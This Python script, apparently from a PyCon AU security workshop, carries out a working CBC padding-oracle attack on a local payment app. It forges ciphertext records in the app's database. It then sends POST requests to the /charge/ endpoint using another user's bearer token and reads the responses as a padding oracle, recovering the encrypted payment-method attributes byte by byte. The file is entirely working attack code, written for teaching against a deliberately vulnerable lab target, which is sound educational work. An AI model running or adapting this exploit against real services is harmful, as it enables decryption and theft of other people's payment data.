import requests
from sqlalchemy import create_engine, insert, delete, Column, String, ForeignKey
from sqlalchemy.orm import scoped_session, sessionmaker, declarative_base, Mapped, mapped_column
from dataclasses import dataclass
import base64

Base = declarative_base()
engine = create_engine("postgresql://postgres:postgres@localhost/pyconau_tute", echo=True)
db_session = scoped_session(sessionmaker(autocommit=False,
                                         autoflush=False,
                                         bind=engine))

Base = declarative_base()
Base.query = db_session.query_property()

## WORKSHOP - Make sure these values are correct
token = "token456" # User 2's token
headers = {
    "Authorization": f"Bearer {token}"
}
# The payment method we want to attack
payment_method_id = 17

@dataclass
class PaymentMethod(Base):
    __tablename__ = "payment_methods"
    id: Mapped[int] = mapped_column(primary_key=True)
    user_id: Mapped[int] =  mapped_column(ForeignKey("users.id"))
    attrs: str

    attrs = Column(String)

    def __init__(self, user_id=None, attrs=None):
        self.user_id = user_id
        self.attrs = attrs

    def __repr__(self):
        return f'<PaymentMethod {self.id!r}>'

# Base URL for the POST request
base_url = "http://127.0.0.1:5000/charge/"

# Returns the PaymentMethod record with the given ID
def get_payment_method(id):
    return PaymentMethod.query.get(id)

# Creates a candidate record with the given payment method and first block
# which has been modified to test the padding for correctness
# Returns the ID of the new record
def create_candidate(payment_method, first_block):
    ct = base64.b64decode(payment_method.attrs)
    modified_ct = bytes(first_block) + ct[16:]
    print(modified_ct.hex())
    attrs = base64.b64encode(modified_ct).decode("utf-8")

    # Create a new PaymentMethod record
    op = insert(PaymentMethod).values(user_id=payment_method.user_id, attrs=attrs).returning(PaymentMethod.id)
    new_payment_method = db_session.execute(op).fetchone()
    db_session.commit()
    return new_payment_method[0]

def delete_candidate(payment_method_id):
    stmt = delete(PaymentMethod).where(PaymentMethod.id == payment_method_id)
    db_session.execute(stmt)
    db_session.commit()

def check_candidate_padding(payment_method_id):
    url = f"{base_url}{payment_method_id}"
    try:
        # Make the HTTP POST request
        response = requests.post(url, headers=headers)
        print("URL: %s", url)
        # Check for success (HTTP status code 2xx)
        print(response)
        if response.ok:
            print(f"Success! ID: {payment_method_id}")
            return True
    except requests.RequestException as e:
        print(f"Request failed for ID {payment_method_id}: {e}")
    return False

def attack_second_block(payment_method):
    zeroizing_iv = [0] * 16
    for pad_val in range(1, 17):
        first_block = [pad_val ^ b for b in zeroizing_iv]

        for candidate_byte in range(256):
            print("\n----> Trying byte: %d\n" % candidate_byte)

            first_block[-pad_val] = candidate_byte
            # create candidate record with first_block as the first block of the ciphertext
            # if the request is successful, the padding is valid
            candidate_id = create_candidate(payment_method, first_block)
            if check_candidate_padding(candidate_id):
                # TODO: Check for false positive
                print(f"Found byte: {candidate_byte}")
                delete_candidate(candidate_id)
                break

            delete_candidate(candidate_id)
        else:
            raise Exception("no valid padding byte found (is the oracle working correctly?)")

        zeroizing_iv[-pad_val] = candidate_byte ^ pad_val

    print(f"Zeroizing IV: {zeroizing_iv}")
    ct = base64.b64decode(payment_method.attrs)

    return bytes(a ^ b for a, b in zip(ct[:16], zeroizing_iv)).decode("utf-8")
        
    
pm = get_payment_method(payment_method_id)
print(pm)
result = attack_second_block(pm)
print(result)
